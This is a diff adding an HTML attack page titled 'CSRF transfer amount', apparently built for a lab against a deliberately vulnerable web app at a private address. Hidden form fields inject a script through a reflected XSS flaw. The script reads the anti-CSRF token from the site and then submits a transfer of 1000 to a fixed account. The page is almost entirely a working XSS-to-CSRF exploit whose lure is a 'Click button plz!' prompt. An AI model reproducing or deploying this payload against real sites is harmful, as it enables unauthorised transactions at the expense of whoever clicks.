@@ -1,0 +1,18 @@
+<div id="main">
+    
+    <h1>CSRF transfer amount</h1>
+
+    <p>Click button plz!</p>
+
+    <form action="http://192.168.0.14/xss_get.php" method="GET">
+
+        <input type="hidden" id="firstname" name="firstname" value='<script>fetch("http://192.168.0.14/csrf_2.php",{method: "POST",headers:{"Content-Type": "application/x-www-form-urlencoded"},cookie:{"security_level":"2"},body: "form=cookies",}).then(response => response.text()).then(data => {token = data.substring(data.indexOf("token")+27,data.indexOf("token")+27+40);console.log(token);fetch(`http://192.168.0.14/csrf_2.php?account=123-45678-90&amount=1000&token=${token}&action=transfer`,{method: "POST", headers:{"Content-Type": "application/x-www-form-urlencoded"},cookie:{"security_level":"2"},body: "form=cookies",}).then(data => {console.log(data);}).catch(error => {console.error("Error:", error);});});'></p>
+
+        <input type="hidden" id="lastname" name="lastname" value="</script>"></p>
+
+        <button type="submit" name="form" value="submit">Click</button>  
+
+    </form>
+
+    <br>
+</div>
